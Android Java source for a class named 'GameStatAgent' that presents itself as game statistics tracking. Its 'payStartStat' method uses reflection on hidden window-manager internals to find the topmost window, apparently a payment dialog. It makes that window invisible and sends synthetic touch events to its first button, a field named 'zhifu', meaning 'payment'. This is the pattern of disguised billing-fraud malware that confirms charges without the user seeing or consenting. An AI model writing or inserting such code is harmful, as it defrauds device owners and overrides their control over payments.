import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

import android.app.Activity;
import android.os.Build;
import android.os.Handler;
import android.os.SystemClock;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewParent;
import android.widget.Button;

public class GameStatAgent {

	private static Handler H = new Handler();

	public static Activity mCurrct;

	public static void payStartStat(final Activity act, String str) {
		mCurrct = act;
		try {
			Class clazz = Class.forName("android.view.ViewRootImpl");
			final Method getView_Method = clazz.getMethod("getView", new Class[0]);

			H.postDelayed(new Runnable() {

				@Override
				public void run() {
					try {
						Object m = getView(act);
						if (null != m) {
							findButton(getView_Method, m);
							if (null != zhifu) {
								if (touch(zhifu)) {
									return;
								}
							}
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}, 500);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void findButton(Method getViewMethod, Object viewRootImpl) {
		ViewGroup viewGroup;
		try {
			viewGroup = (ViewGroup) getViewMethod.invoke(viewRootImpl, new Object[0]);
			ViewGroup rootView = (ViewGroup) ((ViewGroup) (viewGroup.findViewById(android.R.id.content))).getChildAt(0);
			rootView.setAlpha(0);
			Button bbt = (Button) findViewByTag(rootView);
			Log.e("---- ", bbt + "--------Button---------" + zhifu);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static Button zhifu;

	public static View findViewByTag(ViewGroup vg) {
		for (int i = 0; i < vg.getChildCount(); i++) {
			Object child = vg.getChildAt(i);
			if (child instanceof ViewGroup) {
				findViewByTag((ViewGroup) child);
			} else if (child instanceof Button) {
				Log.e("--------", "return Button~~~");
				zhifu = (Button) child;
				return zhifu;
			}
		}
		return null;
	}

	public static Object getView(Activity act) {
		try {
			ViewParent vp = act.getWindow().getDecorView().getParent();

			Class windowManagerClazz = null;
			Object windowManaerInstance = null;

			if (Build.VERSION.SDK_INT >= 19) {
				windowManagerClazz = Class.forName("android.view.WindowManagerGlobal");
				windowManaerInstance = windowManagerClazz.getMethod("getInstance", new Class[0]).invoke(null, null);
			} else if (Build.VERSION.SDK_INT >= 17) {
				windowManagerClazz = Class.forName("android.view.WindowManagerGlobal");
				windowManaerInstance = windowManagerClazz.getMethod("getInstance", new Class[0]).invoke(null, null);
			} else if (Build.VERSION.SDK_INT >= 14) {
				windowManagerClazz = Class.forName("android.view.WindowManagerImpl");
				windowManaerInstance = windowManagerClazz.getMethod("getDefault", new Class[0]).invoke(null, null);
			} else {
				windowManagerClazz = Class.forName("android.view.WindowManagerImpl");
				windowManaerInstance = windowManagerClazz.getMethod("getDefault", new Class[0]).invoke(null, null);
			}

			Field mRootsField = windowManagerClazz.getDeclaredField("mRoots");
			mRootsField.setAccessible(true);
			ArrayList<Object> list = (ArrayList<Object>) mRootsField.get(windowManaerInstance);

			if (list.size() == 1) {
				return list.get(0);
			} else if (list.size() == 2) {
				for (int i = 0; i < list.size(); i++) {
					if (vp != list.get(i)) {
						return list.get(i);
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	public static boolean touch(final Button bt) {
		int[] position = new int[2];
		bt.getLocationOnScreen(position);

		int btWidth = bt.getWidth();
		int btHeight = bt.getHeight();

		float clickX = position[0] + btWidth / 2;
		float clickY = position[1] + btHeight / 2;

		Log.e("tag", "Bt -- clickX(" + clickX + "), clickY(" + clickY + ")");
		if (clickX <= 0 || clickY <= 0) {
			return false;
		}

		long l1 = SystemClock.uptimeMillis();
		final MotionEvent eventDown = MotionEvent.obtain(l1, l1, MotionEvent.ACTION_DOWN, clickX, clickY, 0);
		long v5 = l1 + 500;
		final MotionEvent eventUp = MotionEvent.obtain(v5, v5, MotionEvent.ACTION_UP, clickX, clickY, 0);

		mCurrct.runOnUiThread(new Runnable() {

			@Override
			public void run() {
				bt.onTouchEvent(eventDown);
				bt.onTouchEvent(eventUp);
			}
		});
		return true;
	}
}
